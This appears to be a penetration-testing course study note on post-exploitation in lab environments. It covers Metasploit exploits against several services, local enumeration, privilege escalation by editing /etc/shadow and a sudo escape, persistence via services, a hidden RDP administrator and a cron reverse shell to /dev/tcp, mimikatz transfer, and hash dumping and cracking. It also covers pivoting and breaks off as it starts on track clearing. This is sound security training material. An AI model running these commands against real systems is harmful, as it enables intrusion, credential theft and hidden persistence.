# Host & Network Penetration Testing - Post-Exploitation

Post-exploitation is the final phase of the penetration testing process and consists of the tactics, techniques, and procedures that attackers/adversaries undertake after obtaining initial access to a target system. In this course, you will learn:
- Understand the **purpose and goals of post-exploitation** in the penetration testing life-cycle
- Perform **local enumeration** on compromised systems to gather:
    - Users and groups
    - Stored credentials
    - Running services and system info
- Learn **privilege escalation techniques** on both:
    - Windows systems
    - Linux systems
- Discover how to **maintain access** to compromised targets (persistence)
- Learn how to **dump and crack password hashes** for:
    - Authentication as legitimate users
    - Enabling lateral movement
- Perform **internal network discovery** to identify new targets within the compromised environment
- Learn how to **pivot** to other systems within the internal network
- Gain **hands-on experience** with tools and techniques used in real-world post-exploitation scenarios

<br>

## 1. Windows Local Enumeration

>**Gain access to the target systems**

```shell
# Port scanning with Nmap
ping -c 1 <target_IP>
nmap -sV <target_IP>
# Gain access to the system
searchsploit rejetto
service postgresql start && msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <target_IP>
exploit
```

### 1.1. Enumerating System Information - Windows

What are we looking for?
- Hostname
- OS Name (Windows 7, 8 etc)
- OS Build & Service Pack (Windows 7 SP1 7600)
- OS Architecture (x64/x86) - relevant for payloads and meterpreter version
- Installed updates/Hot-fixes

**Objective:** To cover the process of enumerating local system information from a Windows target.

**Post exploitation** 

```shell
# Enumerating System Information
sysinfo
# The sysinfo command also provides us with information like the hostname, OS architecture and the domain that the target system is a part of.

# We can also enumerate the hostname of the system by spawning a native shell session on the target system.
shell
hostname

# Comprehensive information regarding the target system
shell
system info

# We can also get a list of installed updates on the system with more detailed information like when the update was installed by running the following command.
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Back to the meterpreter session
cd C:\\
cd Windows
cd System32
cat eula.txt # This is another file that can provide with information pertinent to the operating system version and also provide with additional information like the build number ant the service pack. This file not always available.
```

### 1.2. Enumerating Users and Groups - Windows

What are we looking for?
- Current user & privileges
- Additional user information
- Other users on the system
- Groups
- Members of the built - in administrator group

**Objective:** To cover the process of enumerating users and groups on a Windows target system.

**Post exploitation**

```shell
# Enumerate the current users we have access to on the target system.
getuid

# Enumerate the Windows privileges that the Administrator user has.
getprivs

# Check the list of currently logged-on users
background
use post/windows/gather/enum_logged_on_users
set SESSION 1
run

# We can also enumerate the current users we have access to manually via a native shell prompt on the Windows system.
sessions 1
shell
# Enumerate the current user and the privileges this user has
whoami
whoami /priv

# Get a list of user accounts on the system
net users

# Learn more about the Administrator account
net user administrator

# Enumerate the groups on the system
net localgroup

# Wiew the members of a particular group
net localgroup administrators
```

### 1.3. Enumerating Network Information - Windows

What are we looking for?
- Current IP address & network adapter
- Internal networks
- TCP/UDP services running and their respective ports
- Other hosts on the network
- Routing table
- Windows Firewall state

**Objective:** To cover the process of enumerating network information from a Windows target.

**Post exploitation**

```shell
shell
# Display the system's network configuration details, including IP addresses, subnet masks, and default gateways for all network interfaces.
ipconfig
ipconfig /all

route print # Routing table

# This command in Windows shows the ARP cache, listing IP addresses and their associated MAC addresses recently resolved on the local network.
arp -a # This information is going to be important during the Pivoting phase

# View a list of open ports being used by services on the target system
netstat -ano

# Display the current firewall settings for all network profiles (Domain, Private, and Public), including their state (on/off), inbound/outbound rules, and logging configurations.
netsh firewall show state
# OR
netsh advfirewall show allprofiles
# Check additional details about this command. 
```

### 1.4. Enumerating Processes & Services - Windows

**Objective:** To cover the process of enumerating running processes and services on a Windows target.

**Post exploitation**

```shell
# We can utilize meterpreter to search for specific processes that are of interest to you
pgrep
migrate 2160 (explorer ID)
# OR
pgrep explorer.exe
# So whenever we're trying to obtain a stable meterpreter session is always recommended to migrate to explorer.exe, primarily because explorer.exe is rarely stopped or has any issues in terms of stability.

# Enumerate a list of running processes on the Windows target.
ps

shell
# We can enumerate a list of running services 
net start

# We can learn more about the running services 
wmic service list brief

# We can also enumerate a list of running tasks and the corresponding services for each task.
tasklist /SVC

# List of scheduled tasks on the Windows target
schtasks /query /fo LIST # A lot of info so we need to copy paste in a document separately
# This information is important because in certain cases, scheduled tasks could be misconfigured or configured in a way that makes them vulnerable to exploitation, and most specifically, they can be exploited in some cases to elevate our privilege. 
```

### 1.5. Automating Windows Local Enumeration - Windows

**Objective:** To automate local enumeration on Windows by leveraging various post-exploitation Metasploit modules and local enumeration scripts.

**Gain access to the target system**

```shell
# Port scanning with Nmap
ping -c 1 <target_IP>
nmap -sV -p- <target_IP>
#  The Nmap scan reveals that the WinRM port is open on the target system
# Gain access to the system
service postgresql start && msfconsole
use exploit/windows/winrm/winrm_script_exec
set RHOSTS <target_IP>
set USERNAME <username>
set PASSWORD <password>
set FORCE_VBS false
exploit
background
```

**Post exploitation**

```shell
# Lists the privileges available to the current user, useful for checking privilege escalation opportunities  
use post/windows/gather/win_privs

# Enumerates all users currently logged on to the system  
use post/windows/gather/enum_logged_on_users

# Detects whether the system is running inside a virtual machine  
use post/windows/gather/checkvm

# Retrieves a list of installed applications on the target system  
use post/windows/gather/enum_applications

# Enumerates computers in the same domain or network, useful for lateral movement  
use post/windows/gather/enum_computers

# Lists the patches installed on the target system to identify missing or outdated updates  
use post/windows/gather/enum_patches
```

**JAWS** (Just Another Windows Enum Script) is an open-source PowerShell script designed to help penetration testers automate local enumeration and identify privilege escalation vectors on Windows systems.

Paste in the script you copied in a text file, after which save the file as jaws-enum.ps1. 

```shell
sessions -i 1
cd C:\\
mkdir Temp
cd Temp
upload /root/jaws-enum.ps1

# After uploading the script successfully, we will need to spawn a command shell session.
shell
# We can now execute the jaws-enum.ps1 script by running the following command:
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
#  jaws-enum.ps1 script will run and save the results into a file called JAWS-Enum.txt
# Note: JAWS will take a couple of minutes to complete the enumeration process, so do not be alarmed if the script looks like it has paused or stopped running.

# Back to our Meterpreter session.
ls
download JAWS-Enum.txt
```

<br> 

## 2. Linux Local Enumeration

>**Gain access to the Linux target systems.**

```shell
ping -c -1 <target_IP>
nmap -sV <target_IP>
searchsploit vsftpd
service postgresql start && msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target_IP>
exploit

sessions -u 1
sessions
sessions -i 2
```

### 2.1. Enumerating System Information - Linux

**What are we looking for?**
- Hostname
- Distribution & distribution release version
- Kernel version & architecture
- CPU information
- Disk information & mounted drives
- Installed packages/software

```shell
# Enumerate the Linux distribution and the OS architecture
sysinfo

# We can enumerate the hostname of the system by spawning a shell session
shell
/bin/bash -i
hostname

# We can also identify the Linux distro name and release version manually
cat /etc/issue
cat /etc/*release

# Version of the Linux kernel
uname -a
uname -r

# Identify hardware information regarding the CPU being used on the target system
lscpu

# List of storage devices attached to the Linux system
df -h

# Enumerate environment variable for a specific user, useful for privilege escalation part
env
# The PAT=/usr/local/sbin: .... The PATH environement specifies the directory that is used by default whenever you type a command or rather for binaries. 

# Installed software or packages
dpkg -l
```

### 2.2. Enumerating Users and Groups - Linux

**Objective:** Enumerate the target machine to gather users & groups information.

```shell
# Enumerate the current user
getuid
# We can also obtain the same information manually
shell
/bin/bash -i
whoami

# we can enumerate the groups that the root user is a part of
groups root

# List of other user and service accounts
cat /etc/passwd
cat  /etc/passwd | grep -v /nologin # So if were other user accounts on this Linux system, they would be displayed right over here. 
# Output explained:
# Username:Userid:GroupID:HomeDirectory:Shell

# I there was another use account a standard account, then  the home directory would be stored under the home directory
ls /home

# List of groups and members of a group
groups 
groups bob
usermod -aG root bob
groups bob

# We can view the users that are currently logged in
who
last
lastlog
```

### 2.3. Enumerating Network Information - Linux

**What are we looking for?**
- Current IP address & network adapter
- Internal networks
- TCP/UDP services running and their respective ports
- Other hosts on the network

**Objective:** Enumerate the target machine to gather network information.

```bash
# Check network interfaces on the target system
ifconfig
ip a s  # Alternative to ifconfig, shows detailed info for each interface

# Check current active connections (e.g., Meterpreter reverse shell on port 4433)
netstat

# View the routing table for the target
route

# Drop into a full interactive shell for better command support
shell
/bin/bash -i

# Once in shell, check interfaces again (if needed)
ifconfig
ip a s  # Often shows other reachable networks for potential pivoting

# Basic system network info
cat /etc/networks # Network names
cat /etc/hostname # Hostname of the machine
cat /etc/hosts # Local hostname-to-IP mapping
cat /etc/resolv.conf # DNS server configuration

# List ARP table to see devices the target has communicated with (may not be installed)
arp -a
# Use Meterpreter's ARP command to list the ARP cache from the target
arp # Shows IP-to-MAC mappings of known network hosts
```

### 2.4. Enumerating Processes & Cron Jobs - Linux

**What are we looking for?**
- Running services
- Cron Jobs

**Objective:** Enumerate the target machine to gather processes & cron jobs information.

```shell
# We can begin by enumerating the list of running processes on the target system
ps

# We can also find the PID of a specific service
pgrep vsftpd

# We can enumerate the list of cron jobs on the Kali Linux system
ls -al /etc/cron*

crontab -l
ls -al /etc/cron*
cat /etc/cron*
```

### 2.5. Automating Linux Local Enumeration

**Objective:** To automate local enumeration on Linux by leveraging various post-exploitation Metasploit modules and local enumeration scripts.

**Gain access to the system** 

```shell
ping -c 1 <target_IP>
nmap -sV <target_IP>
service  postgresql start && msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <target_IP>
set TARGETURI /gettime.cgi
set LHOST <local_IP>
exploit
```

**Post exploitation**

```shell
# set SESSION 1

use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system
```

Automating local enumeration with **LinEnum**

```shell
# You will need to copy the content of the script in raw format and paste it into a text file
# We can now navigate back to our meterpreter session and navigate to the tmp drive by running the following command
cd /tmp
upload /root/Desktop/LinEnum.sh
shell
/bin/bash -i
chmod +x LinEnum.sh
./LinEnum.sh
```

<br>

## 3. Transferring Files To Windows & Linux Targets

### 3.1. Setting up a Web Server with Python

**Objective:** To cover the process of setting up a web server with Python to facilitate files from an attacker's system to the target system.

In some cases, you won’t have a Meterpreter session on the target, so you’ll need to use built-in OS tools to transfer files manually. It’s essential to know how to move files from your machine to the compromised target, regardless of its operating system - **never rely solely on Meterpreter**.

The file transfer process has two steps:
1. **Host the file** on a web server (your system).
2. **Download the file** from the target machine.

In this section, we focus on step 1: hosting the file.
Instead of setting up a full web server like Apache or Nginx, you can use the faster and simpler option:

```shell
# Python 3
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80
```

### 3.2. Transferring Files to Windows Targets

**Objective:** To cover the process of transferring files to Windows targets by leveraging a web server running on the Kali Linux system.

**Gain access to the target systems**

```shell
# Port scanning with Nmap
ping -c 1 <target_IP>
nmap -sV <target_IP>
# Gain access to the system
searchsploit rejetto
service postgresql start && msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <target_IP>
exploit
```

**Post exploitation**

```shell
# In this case, we will be transferring the mimikatz.exe executable found under the /usr/share/windows-resources/mimikatz/x64 directory on the Kali Linux system.
cd /usr/share/windows-resources/mimikatz/x64

# We can then start a web server with Python3 in this directory
python3 -m http.server 80

# We can now navigate back to the meterpreter session on the target system, navigate to the C:\ drive and create the Temp directory.
cd C:\\
mkdir Temp
cd Temp
shell

# We can now download the mimikatz.exe executable from the web server being hosted on the Kali Linux system 
certutil -urlcache -f http://<kali_IP>/mimikatz.exe mimikatz.exe
```

### 3.3. Transferring Files to Linux Targets

**Objective:** Exploit the vulnerable service using suitable Metasploit module and then transfer files to the Linux target by leveraging a web server running on the Kali machine.

**Gain access to the system**

```shell
ping -c 1 <target_IP>
nmap -sV <target_IP>
# The Nmap scan reveals a vulnerable version of SAMBA running on port 445.
service postgresql start && msfconsole
use exploit/linux/samba/is_known_pipename
set RHOST <target_IP>
exploit
```

**Post exploitation** 

```shell
# We will be transferring the php-backdoor.php file found under /usr/share/webshells/php/ directory on the Kali machine.
cd /usr/share/webshells/php/
python3 -m http.server 80

# Navigate back to the command shell session on the target system and download the php-backdoor.php file from the web server being hosted on the Kali linux system
wget http://<kali_IP>/php-backdoor.php
```

<br>

## 4. Upgrading Shells

### 4.1. Upgrading Non - Interactive Shells

Upgrading non-interactive shells to interactive ones is an important technique during penetration testing and post-exploitation to gain better control and functionality on the target system. Shells obtained via netcat or certain reverse shell payloads often lack interactive TTY capabilities.

 `/bin/bash -i` - This upgrades it to an interactive shell, which is much more usable. Upgrading is important because non-interactive shells often lack basic features like prompt display, command history, or proper input handling.

**Objective:** Exploit the vulnerable service using suitable Metasploit module and then upgrade the non-interactive shell.

**Gain access to the system**

```shell
ping -c 1 <target_IP>
nmap -sV <target_IP>
# The Nmap scan reveals a vulnerable version of SAMBA running on port 445.
service postgresql start && msfconsole
use exploit/linux/samba/is_known_pipename
set RHOST <target_IP>
exploit
```

**Post exploitation** 

One simple way to tell you’re in a non-interactive shell is the absence of a prompt. Previously, we used `/bin/bash -i` to upgrade the shell, assuming bash is installed — but not all Linux systems have it. To check which shells are available on the target, run: `cat /etc/shells`. 

**The first step is to display the list of shells installed on the target system.**

```shell
cat /etc/shells
/bin/bash -i

# We can also spawn a bash session with Python.
python --version
python -c 'import pty; pty.spawn("/bin/bash")'
```

<br>

## 5. Privilege Escalation

### 5.1. Identifying Windows Escalation Vulnerabilities

Privilege escalation is a complex phase of post-exploitation, not just because of the operating system, but due to the wide range of available techniques. To escalate privileges on a Windows system, the first and most consistent step is identifying privilege escalation vulnerabilities on the compromised machine. After this, the tools and methods used will vary depending on factors such as:
- The version of Windows    
- The system’s unique configuration 
Since this process can be tedious and time-consuming, it's highly recommended to **automate the identification of privilege escalation vulnerabilities** whenever possible.

The **PrivescCheck** script enumerates common Windows configuration issues that can be leveraged for local privilege escalation.

In this case the target **system doesn't have any vulnerable services** running on it. So the way we're going to gain access to the system is by utilizing a Metasploit framework module called **web_delivery**.

```shell
service postgresql start && msfconsole
search web_delivery
use exploit/multi/script/web_delivery
show info
```

This particular module sets up a web server that hosts a payload based on the target operating system. Once you hit exploit, it then generates some PowerShell code, we'll then copy that PowerShell code and execute it on the target system, which will consequently download the payload that is being hosted on the web server and execute it. This will provide us with a standard command shell session, which we can then upgrade to a meterpreter session.

```shell
show options
set TARGET PSH\ (Binary) # PowerShell
set PAYLOAD windows/shell/reverse_tcp
set PSH-EncodedCommand flase
set LHOST <kali_IP> # eth1
exploit
# It will generate some PowerShell code. Copy the PowerShell code.

# Now switch to the Windows system, open a Command Prompt Session and paste the code then enter. Don't worry if the window disappears.

# Back to the Kali system we can see Command shell session 1 opened. Hit enter.
sessions
sessions 1 
# We currently have access to the target system through a simple commnad shell session.
whoami
hostname

# Before move forward we want to migrate this command shell session to a mterepreter session. 
background
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options
set LHOST <kali_IP> # eth1
set SESSION 1
show advanced
# We need to set an additional option that is...
set WIN_TRANSFER VBS # Instead of POWERSHELL
show options
exploit
# Stop the exploit multi handler.

sessions
sessions 2 # This is the meterpreter session

sysinfo
pgrep explorer
migrate <process_id>
getuid
getprivs
```

**Identify privilege escalation vulnerabilities**

```bash
cd C:\\Users\\students\\Desktop\\PrivescCheck
dir # We have the PrivescCheck.ps1
shell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck" # Check GitHub
# Script executed
```

We continue from where we left in the previous section. 
We got credentials like Username and Password.

Open a new terminal tab

```bash
psexec.py Administrator@<target-ip address>
# Now use the password
whoami
net user
whoami /priv
```

Now if we want to obtain an elevated meterpreter session and we have administrator credentials we can do this within the Metasploit framework. 

```bash
# Back to the first terminal tab
background
sessions # We have unprivilege meterpreter session

search psexec
use exploit/windows/smb/psexec
show options
set LHOST <kali-ip>
set LPORT <local_port>
set RHOST <target-ip>
set SMBUser Administrator
set SMBPAss <password identified>
# We should now receive an elevated meterpreter session
sysinfo
getuid
```

### 5.2. Windows: PrivescCheck

**Objective:** Gain Administrator user privilege and find the flag.

*In this example we have access to both Kali and target Windows machine.*

```shell
# Switch to the Victim machine
cmd
whoami
cd C:\Users\student\Desktop\PrivescCheck
ls

# Running PrivescCheck.ps1 script; it would take 1-2 minutes to finish
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

# We have received the report and we can notice that we found WinLogon credentials. Investigate WinLogon output.

# We're launching the Command Prompt (cmd.exe) with administrator privileges using runas.exe and the admin credentials we previously discovered.
runas.exe /user:administrator cmd
<password>
whoami

# Switch to the Kali Machine.
# Running the hta_server module to gain the meterpreter shell.
msfconsole -q
use exploit/windows/misc/hta_server
# This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell.
exploit
# Copy the generated payload

# Switch to Victim Machine
mshta.exe <generated_payload>
# mshta.exe is a legitimate Windows utility used to execute Microsoft HTML Applications (HTA).
# An HTA (HTML Application) is a file with the .hta extension that combines HTML, CSS, and scripting languages like VBScript or JavaScript to create a Windows-based GUI application.

# We can expect a meterpreter shell.
sessions -i 1
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```

### 5.3. Linux Privilege Escalation - Permissions Matter!

**Objective:** Your mission is to get a root shell on the box and retrieve the flag!

```shell
ping -c 1 <target_IP>

# Open a browser and navigate to the following URL to explore the service running on port 8000

# This command searches the entire filesystem (/) for files or directories that are not symbolic links (-not -type l) and are world-writable (-perm -o+w). It helps identify potentially insecure files that anyone on the system can write to, which can be a security risk.
find / -not -type l -perm -o+w

# Observe from the result that /etc/shadow is world writable. Verify the same and also check its contents.
ls -l /etc/shadow
cat /etc/shadow

# Observe that the root password is not set. Adding a known password in the shadow file can escalate to root. Use openssl to generate a password entry. - root:*:... -
openssl passwd -1 -salt abc password

# Copy the generated entry and add it to the root record in /etc/shadow
vim /etc/shadow
<root:HASH:...>

# After making the changes, try to switch to the root user.
su

# Once the escalation to root is complete, retrieve the flag located in /root directory.
cd /root
ls -l
cat flag
```

**Note**: `sudo su` works only if the current user has `sudo` privileges, allowing them to become root directly. If the user is low-privileged and not in the sudoers group, `sudo su` won’t work, and privilege escalation must be done another way. One method is injecting a known password hash into `/etc/shadow`, which allows logging in as root using `su` and that password, even without `sudo` access.

### 5.4. Linux Privilege Escalation - SUDO Privileges

You have managed to get access to the "student" account on the client's server. This is bad enough as all the student resources are available to you. You are now trying to escalate privileges to get root. After some digging around and from other sources, you figure out that the same person in the organization uses both the student account and the root account on the system.

**Objective:** Your task is to escalate privileges on the target machine, get a root shell on the box and retrieve the flag!

```shell
ping -c 1 target.ine.local

# Open a browser and navigate to the following URL to explore the service running on port 8000

# !! There is no specific hint given in this challenge, so start with finding setuid program approach.

find / -user root -perm -4000 -exec ls -ldb {} \;
# Searches the entire filesystem (/) for files that are owned by root and have the SUID (Set User ID) bit set — represented by 4000. The SUID permission allows a file to be executed with the privileges of its owner (in this case, root), which can be exploited for privilege escalation if the file is vulnerable. The -exec ls -ldb {} part lists each found file with detailed permissions and ownership info.

# No anomaly is there. Move on to finding misconfigured sudo. Check the current sudo capabilities. Check if we can run sudo without a password
sudo -l

# The man entry depicts that the man command can be run using sudo without providing any password. Run it and launch /bin/bash from it
# We got (root) NOPASSWD: /usr/bin/man
# This means the user student is allowed to run the man command as root without needing a password using sudo.
sudo man ls
# Once inside the manual page:
!/bin/bash
# You now have a root shell
cd /root
ls -l
cat flag
```

<br>

## 6. Windows Persistence

### 6.1. Maintaining Access: Persistence Service ⚗️

We will learn about a way of maintaining persistent access to the target machine using the Metasploit module. Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module. 

Use the `exploit/windows/local/persistence_service` local exploit module to maintain access.

**Objective:** Exploit the application and maintain access using the Metasploit module.

**Note**: Elevated privileges are required in order to establish persistence on a Windows system.

**Gain access to the system**

```shell
ping -c 1 demo.ine.local
nmap -sV <target_IP>
searchsploit hfs 2.3
service postgresql start && msfconsole
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS <target_IP>
set LHOST <local_IP>
exploit
background
```

**Maintain Access**

```shell
search persistence_service
use exploit/windows/local/persistence_service
show options
set SESSION 1
exploit
# By default persistence, the local exploit module uses the following payload: windows/meterpreter/reverse_tcp

# Start another msfconsole and run multi handler to re-gain access.
use exploit/multi/handler
set LHOST <Kali_IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
exploit

# Switch back to the active meterpreter session and reboot the machine.
session -i 1
reboot
# Once the machine reboots we would expect a new meterpreter session without re-exploitation. This happened because we have added a malicious executable for maintaining access.
```

### 6.2. Persistence via RDP

This section demonstrates how to fingerprint and exploit a vulnerable application on a target machine and maintain access using Remote Desktop Protocol (RDP).

**Objective:** Exploit the application and maintain access using RDP.

**Gain access to the system**

```shell
nmap -sV <target_IP>
searchsploit badblue 2.7
service postgresql start && msfconsole
use exploit/windows/http/badblue_passthru
set RHOSTS <target_IP>
exploit
# We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.
pgrep explorer
migrate <process id>
sysinfo
```

**Maintain Access**

We have successfully migrated into the explorer.exe process. We are going to maintain access by RDP. We will be creating a user and adding that user to the Administrators group. All this can be done using the `getgui` meterpreter command.

The `getgui` command makes the below changes to the target machine:

- Enable RDP service if it’s disabled
- Creates new user for an attacker
- Hide user from Windows Login screen
- Adding created user to "Remote Desktop Users" and "Administrators" groups

```shell
run getgui -e -u <username> -p <password>
```

Running getgui command to gain remote access:

```shell
 xfreerdp /u:<username> /p:<password> /v:<target_IP>
 cmd
 whoami 
```

<br>

## 7. Linux Persistence

### 7.1. Persistence via SSH Keys - Maintaining Access

**Objective:** Maintain access on the target machine after the credentials are modified. Use SSH related artifacts for this. Retrieve flag from the target machine.

The SSH login credentials are provided in the challenge description:
- Username: student
- Password: password

```shell
ping -c 1 <target_IP>
nmap -sV <target_IP>
ssh student@<target_IP>

# Enumerate files present in home directory.
ls -al
# SSH key pair is present in the “.ssh” directory.

# Exit SSH session and copy ssh private key to attacker machine.
scp student@<target_IP>:~/.ssh/id_rsa .

# SSH into student machine and delete the wait file.
ssh student@<target_IP>
rm wait # The SSH session is terminated.

# SSH into the target machine with the private key.
chmod 400 id_rsa
# In short: It secures your private key by making it readable only by you and no one else.
ssh -i id_rsa student@<target_IP>

# Retrieve the flag.
ls -l
cat flag.txt
```

### 7.2. Persistence Via Cron Jobs - Local Job Scheduling ⚗️

Local Job Scheduling refers to the ability to create pre-scheduled and periodic background jobs using various mechanism (e.g cron, launchd). Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence.

**Reference:** https://attack.mitre.org/techniques/T1053/

**Objective:** Maintain access on the target machine after the credentials are modified. Schedule a popular HTTP python server module to achieve this. Finally, retrieve the flag from the target machine.

The SSH login credentials are provided in the challenge description:
- Username: student
- Password: password

```shell
ping -c 1 <target_IP>
nmap -sV <target_IP>
ssh student@<target_IP>

# Check the running processes.
ps -eaf # Cron service is running.

# Create a cron job which will use the SimpleHTTPServer python module to serve the files present in student user’s home directory.
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
crontab -i cron
crontab -l

# Exit the session. Login and delete the wait file.
ssh student@<target_IP>
rm wait

# Retrieve the flag.
curl demo.ine.local:8000
curl demo.ine.local:8000/flag.txt

# Use nmap to scan for open ports. Since the HTTP server was started, port 8000 should be open.
nmap -p- demo.ine.local

# !! Alternative
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<my-ip>/1234 0>&1'" > cron
crontab -i cron
crontab -l 
ls

# Exit the session. Login and delete the wait file.
ssh student@<target_IP>
rm wait

# Retrieve the flag.
nc -nvlp 1234
ls -al
cat flag.txt 
# This work every minute
```

<br>

## 8. Dumping & Cracking Hashes

### 8.1. Windows: NTLM Hash Cracking

You'll learn to perform security testing on a Windows system by identifying and exploiting vulnerabilities to crack NTLM hashes.

**Objective:** To exploit a vulnerable Windows server, extract NTLM hashes, and attempt to crack these hashes.

**Gain access to the system**

```shell
ping -c 1 <target_IP>
nmap -sV <target_IP>
searchploit BadBlue
searchsploit badblue 2.7
service postgresql start && msfconsole
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
# We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.
pgrep lsass.exe
migrate <process_id>
sysinfo
```

**Dump NTLM hashes**

```shell
# List of user accounts and their hashes  
hashdump

# Verify that the hashes are stored in the MSF database or not.
background
creds
```

**Crack NTLM hashes using Metasploit**

```shell
# Use an auxiliary NTLM hash cracking module to crack stored NTLM hashes.
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
creds
```

**Crack NTLM hashes using John The Ripper**

```shell
# Let's confirm what other users account are on the system
shell
net user
# Terminate this channel CTRL + C

# Copy the hashes above as they are. Open a new terminal tab. 
cd Desktop/
vim hashes.txt # Paste the hashes as they are save anq quit: i, paste, :wq
cat hashes.txt
```

Let's start off by exploring how we can crack NTLM hashes with John The Ripper.

```shell
john
john --list=formats
john --list=formats | grep NTLM
john --list=formats | grep NT

# If we don't specify the word list, then Jon The Ripper will use its defauls word list.
john --format=NT hashes.txt

# Now if we want to specify word list we can...
john --format=NT hashes.txt --wordlist=<wordlist_location>
# Save the credentials

# Example:
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

From a penetration tester’s perspective, this information is extremely valuable because it means we can now legitimately authenticate to the target system — either through **RDP** or another protocol such as **SSH**.

**Crack NTLM hashes using Hashcat**

```shell
hashcat --help
hashcat -a 0 -m 1000 hashes.txt /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

**Access the system**

```shell
xfreerdp /u:Administrator /p:password /v:<target_IP>
y
```

### 8.2. Dumping & Cracking Linux Hashes

**Initial enumeration and vulnerability identification**

```shell
# STEP 1: Initial enumeration and vulnerability identification

ifconfig  # Check your local IP address
nmap -sV <target-ip>  # Scan services and versions on the target

# Look for known vulnerabilities related to ProFTPD
searchsploit ProFTPD

# STEP 2: Exploitation with Metasploit

service postgresql start && msfconsole  # Start database and launch Metasploit
setg RHOSTS <target-ip>  # Set the target globally

search ProFTPD  # Look for available ProFTPD exploits
use exploit/unix/ftp/proftpd_modcopy  # Example of a relevant exploit
show options
exploit  # Launch the attack

# If exploitation is successful and you have a shell as root:
whoami
id
/bin/bash -i  # Spawn an interactive bash shell if needed

cat /etc/shadow  # Dump the shadow file manually
# → Password hashes appear like: $6$... → $6 means SHA-512
# → Copy the full hash string carefully

# Background the session and prepare for hash extraction
background
sessions
sessions -u 1  # Upgrade session if needed
sessions  # Check active sessions

# Use a Metasploit post module to extract hashes
search hashdump
use post/linux/gather/hashdump
show options
set SESSION 2  # Replace with your active session ID
run

# Take note of the generated file path (loot location)
# Example: /root/.msf4/loot/2025_04_10/.../shadow.txt

# Exit Metasploit
exit -y
```

**Cracking the hashes with John the Ripper**

```shell
gzip -d /usr/share/wordlists/rockyou.txt.gz  # Decompress the wordlist

# Crack the hashes using John (SHA-512 is the format for $6$ hashes)
john --format=sha512crypt /root/.msf4/loot/....shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Wait a few minutes — John will reveal the cracked password
```

**Cracking with Hashcat**

```shell
# Identify the correct mode for SHA-512 (Linux shadow format)
hashcat --help | grep 1800  # 1800 = sha512crypt

# Run Hashcat (mode 1800 for SHA-512, attack mode 0 for dictionary attack)
hashcat -m 1800 -a 0 /root/.msf4/loot/...shadow.txt /usr/share/wordlists/rockyou.txt

# Hashcat will display: <hash>:<plaintext_password>
```

<br>

## 9. Pivoting

This lesson focuses on the concept of pivoting, a crucial technique in penetration testing that allows an attacker to move from one compromised system to another within the same network. By exploiting vulnerabilities on the initial target, you will gain access and then pivot to exploit and access a secondary target.

```shell
ping -c 1 <target_IP1>
ping -c 1 <taregt_IP2> # No response.

# Gain access to the Target 1
nmap -sV <target_IP1>
searchsploit hfs
searchsploit rejetto
service postgresql start && start
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOSTS <target_IP1>
exploit

# We have successfully exploited the target vulnerable application (hfs) and received a meterpreter shell. Check target machine IP Address.
ipconfig

# We can observe, there is only one network adapter and we have two machine IP addresses. But, we cannot access “Victim Machine 2” directly from the attacker’s machine. We will add a route and then we will run an auxiliary port scanner module on the second victim machine to discover a host and open ports.
run autoroute -s <target_IP1/mask> 
# e.g. IP > 10.0.29.148 Mask > 255.255.255.0 ------ IP 10.0.29.0 !!!
run autoroute -p
background

background
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_IP2>
set PORTS 1-100
exploit

# We have discovered port 80 on the pivot machine. Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap. 
sessions -i 1
portfwd add -l 1234 -p 80 -r <target_IP2>
portfwd list

# Open a new terminal tab
db_nmap -sV -sS -p 1234 localhost

# Now we can now actually exploit victim machine 2 from within msfconsole. 
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS <target_IP2>
exploit

# We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.
shell
cd /
dir
type flag.txt
```

**So just to summarize:**
- Gained access to **Victim Machine 1**.
- Added a route to its internal subnet to reach **Victim Machine 2**.
- Scanned and discovered **open ports** on Victim 2.
- Forwarded remote ports from Victim 2 to a **local port** on Kali for analysis.
- Used **Nmap** to identify service versions.
- Launched an exploit to gain access to **Victim Machine 2**.

<br>

## 10. Clearing Your Tracks

### 10.1. Clearing Your Tracks On Windows

Clearing tracks after exploiting a system is a crucial step for attackers who want to avoid detection and maintain access. Metasploit, a popular framework for developing and executing exploit code against a remote target machine, also includes techniques that can be used to cover tracks after an exploit.

**Gain access to the system**

```shell
ping -c 1 <target_IP>
nmap -sV <target-ip>
# The target system has a vulnerable version of BadBlue running on port 80 that can be exploited through the use of a Metasploit module.
service postgresql start && msfconsole
search badblue
use exploit/windows/http/badblue_passthru
show options
set RHOSTS <target_IP>
exploit

sysinfo
getuid

pgrep explorer
migrate <process_ID>

sysinfo
